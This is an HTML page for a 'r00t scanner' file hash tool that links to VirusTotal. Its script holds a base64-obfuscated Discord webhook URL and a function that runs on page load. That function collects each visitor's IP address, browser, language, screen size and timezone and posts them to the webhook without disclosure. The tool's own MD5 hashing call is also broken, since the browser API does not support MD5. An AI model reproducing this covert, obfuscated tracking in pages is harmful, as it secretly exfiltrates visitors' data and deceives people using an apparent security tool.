<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>r00t scanner</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0a0a0a;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            width: 100%;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 20px 0;
            border-bottom: 1px solid #333;
        }

        h1 {
            font-size: 2.5rem;
            color: #888;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }

        .tagline {
            font-size: 1rem;
            color: #666;
            margin-bottom: 20px;
        }

        .upload-area {
            background-color: #111;
            border: 2px dashed #333;
            border-radius: 8px;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 30px;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .upload-area:hover {
            border-color: #666;
            background-color: #151515;
        }

        .upload-area.dragover {
            border-color: #666;
            background-color: #1a1a1a;
        }

        .upload-icon {
            font-size: 48px;
            color: #666;
            margin-bottom: 15px;
        }

        .upload-text {
            margin-bottom: 15px;
        }

        .browse-btn {
            background-color: #444;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        .browse-btn:hover {
            background-color: #555;
        }

        #file-input {
            display: none;
        }

        .file-info {
            background-color: #111;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            display: none;
        }

        .file-info h3 {
            color: #888;
            margin-bottom: 15px;
        }

        .info-row {
            display: flex;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #222;
        }

        .info-label {
            width: 120px;
            font-weight: bold;
            color: #aaa;
        }

        .info-value {
            flex: 1;
            word-break: break-all;
        }

        .hash-value {
            font-family: monospace;
            background-color: #1a1a1a;
            padding: 5px 10px;
            border-radius: 4px;
            color: #888;
        }

        .actions {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }

        .scan-btn {
            background-color: #444;
            color: white;
        }

        .scan-btn:hover {
            background-color: #555;
        }

        .reset-btn {
            background-color: #333;
            color: #e0e0e0;
        }

        .reset-btn:hover {
            background-color: #444;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #888;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        footer {
            margin-top: 40px;
            text-align: center;
            color: #666;
            font-size: 0.9rem;
            padding: 20px 0;
            border-top: 1px solid #333;
            width: 100%;
        }

        .virus-total-link {
            color: #888;
            text-decoration: none;
            margin-top: 10px;
            display: inline-block;
        }

        .virus-total-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>r00t scanner</h1>
            <p class="tagline">File hash generator & security scanner</p>
        </header>

        <main>
            <div class="upload-area" id="upload-area">
                <div class="upload-icon"></div>
                <p class="upload-text">Drag & drop your file here or click to browse</p>
                <button class="browse-btn">Browse Files</button>
                <input type="file" id="file-input">
            </div>

            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Calculating file hash...</p>
            </div>

            <div class="file-info" id="file-info">
                <h3>File Information</h3>
                <div class="info-row">
                    <div class="info-label">File Name:</div>
                    <div class="info-value" id="file-name">-</div>
                </div>
                <div class="info-row">
                    <div class="info-label">File Size:</div>
                    <div class="info-value" id="file-size">-</div>
                </div>
                <div class="info-row">
                    <div class="info-label">File Type:</div>
                    <div class="info-value" id="file-type">-</div>
                </div>
                <div class="info-row">
                    <div class="info-label">MD5 Hash:</div>
                    <div class="info-value">
                        <span class="hash-value" id="md5-hash">-</span>
                    </div>
                </div>
                <div class="info-row">
                    <div class="info-label">SHA-1 Hash:</div>
                    <div class="info-value">
                        <span class="hash-value" id="sha1-hash">-</span>
                    </div>
                </div>
                <div class="info-row">
                    <div class="info-label">SHA-256 Hash:</div>
                    <div class="info-value">
                        <span class="hash-value" id="sha256-hash">-</span>
                    </div>
                </div>
                
                <div class="actions">
                    <button class="btn scan-btn" id="scan-btn">Scan with VirusTotal</button>
                    <button class="btn reset-btn" id="reset-btn">Analyze Another File</button>
                </div>
            </div>
        </main>

        <footer>
            <p>r00t scanner - File Security Analysis Tool</p>
            <a href="https://www.virustotal.com" target="_blank" class="virus-total-link">Powered by VirusTotal</a>
        </footer>
    </div>

    <script>
        // Webhook URL encoded
        const webhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMzE4MzEwNTQwNTA5NTk0Ni81c3Fudzc0TUMydjM1TDlmZmFBcnc2ZXNLdHIzbmhDYlVnb20yM1NwcGJjc0RjVVg3cWdzc3lfYWc1eEdlOEU5ZzN4";

        // Function to decode base64
        function decodeBase64(str) {
            return decodeURIComponent(escape(atob(str)));
        }

        // Function to send visitor info to Discord
        async function sendVisitorInfo() {
            try {
                // Get visitor IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const visitorIP = ipData.ip;

                // Get additional info
                const userAgent = navigator.userAgent;
                const browserLanguage = navigator.language;
                const currentTime = new Date().toLocaleString();
                const screenResolution = `${screen.width}x${screen.height}`;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                // Prepare data for Discord
                const discordData = {
                    content: `ðŸ” **New Visitor on r00t scanner**\n\n**IP Address:** ${visitorIP}\n**Browser:** ${userAgent}\n**Language:** ${browserLanguage}\n**Screen:** ${screenResolution}\n**Timezone:** ${timezone}\n**Visit Time:** ${currentTime}\n\n*File scanner accessed*`
                };

                // Send to Discord webhook
                await fetch(decodeBase64(webhookUrl), {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(discordData)
                });

            } catch (error) {
                console.log('Error sending visitor info');
            }
        }

        // Send visitor info when page loads
        window.addEventListener('load', sendVisitorInfo);

        // File handling functionality
        document.addEventListener('DOMContentLoaded', function() {
            const uploadArea = document.getElementById('upload-area');
            const fileInput = document.getElementById('file-input');
            const fileInfo = document.getElementById('file-info');
            const fileName = document.getElementById('file-name');
            const fileSize = document.getElementById('file-size');
            const fileType = document.getElementById('file-type');
            const md5Hash = document.getElementById('md5-hash');
            const sha1Hash = document.getElementById('sha1-hash');
            const sha256Hash = document.getElementById('sha256-hash');
            const scanBtn = document.getElementById('scan-btn');
            const resetBtn = document.getElementById('reset-btn');
            const loading = document.getElementById('loading');

            // Click to upload
            uploadArea.addEventListener('click', () => {
                fileInput.click();
            });

            // Drag and drop handlers
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
                uploadArea.addEventListener(eventName, preventDefaults, false);
            });

            function preventDefaults(e) {
                e.preventDefault();
                e.stopPropagation();
            }

            ['dragenter', 'dragover'].forEach(eventName => {
                uploadArea.addEventListener(eventName, highlight, false);
            });

            ['dragleave', 'drop'].forEach(eventName => {
                uploadArea.addEventListener(eventName, unhighlight, false);
            });

            function highlight() {
                uploadArea.classList.add('dragover');
            }

            function unhighlight() {
                uploadArea.classList.remove('dragover');
            }

            uploadArea.addEventListener('drop', handleDrop, false);

            function handleDrop(e) {
                const dt = e.dataTransfer;
                const files = dt.files;
                handleFiles(files);
            }

            // File input change
            fileInput.addEventListener('change', function() {
                handleFiles(this.files);
            });

            // Process files
            function handleFiles(files) {
                if (files.length > 0) {
                    const file = files[0];
                    processFile(file);
                }
            }

            // Process and hash file
            function processFile(file) {
                loading.style.display = 'block';
                fileInfo.style.display = 'none';

                fileName.textContent = file.name;
                fileSize.textContent = formatFileSize(file.size);
                fileType.textContent = file.type || 'Unknown';

                calculateFileHash(file)
                    .then(hashes => {
                        md5Hash.textContent = hashes.md5;
                        sha1Hash.textContent = hashes.sha1;
                        sha256Hash.textContent = hashes.sha256;

                        loading.style.display = 'none';
                        fileInfo.style.display = 'block';
                    })
                    .catch(error => {
                        console.error('Hash calculation error:', error);
                        loading.style.display = 'none';
                        alert('Error calculating file hash. Please try again.');
                    });
            }

            // Format file size
            function formatFileSize(bytes) {
                if (bytes === 0) return '0 Bytes';
                const k = 1024;
                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            }

            // Calculate file hashes
            async function calculateFileHash(file) {
                return new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    
                    reader.onload = function(e) {
                        const arrayBuffer = e.target.result;
                        
                        crypto.subtle.digest('MD5', arrayBuffer)
                            .then(md5Buffer => {
                                const md5 = hexString(new Uint8Array(md5Buffer));
                                
                                return crypto.subtle.digest('SHA-1', arrayBuffer)
                                    .then(sha1Buffer => {
                                        const sha1 = hexString(new Uint8Array(sha1Buffer));
                                        
                                        return crypto.subtle.digest('SHA-256', arrayBuffer)
                                            .then(sha256Buffer => {
                                                const sha256 = hexString(new Uint8Array(sha256Buffer));
                                                
                                                resolve({
                                                    md5: md5,
                                                    sha1: sha1,
                                                    sha256: sha256
                                                });
                                            });
                                    });
                            })
                            .catch(reject);
                    };
                    
                    reader.onerror = reject;
                    reader.readAsArrayBuffer(file);
                });
            }

            // Convert to hex string
            function hexString(buffer) {
                return Array.from(buffer)
                    .map(b => b.toString(16).padStart(2, '0'))
                    .join('');
            }

            // Scan with VirusTotal
            scanBtn.addEventListener('click', function() {
                const hash = sha256Hash.textContent;
                if (hash && hash !== '-') {
                    window.open(`https://www.virustotal.com/gui/file/${hash}`, '_blank');
                } else {
                    alert('Please upload a file first to generate a hash.');
                }
            });

            // Reset button
            resetBtn.addEventListener('click', function() {
                fileInput.value = '';
                fileInfo.style.display = 'none';
                loading.style.display = 'none';
            });
        });
    </script>
</body>
</html>
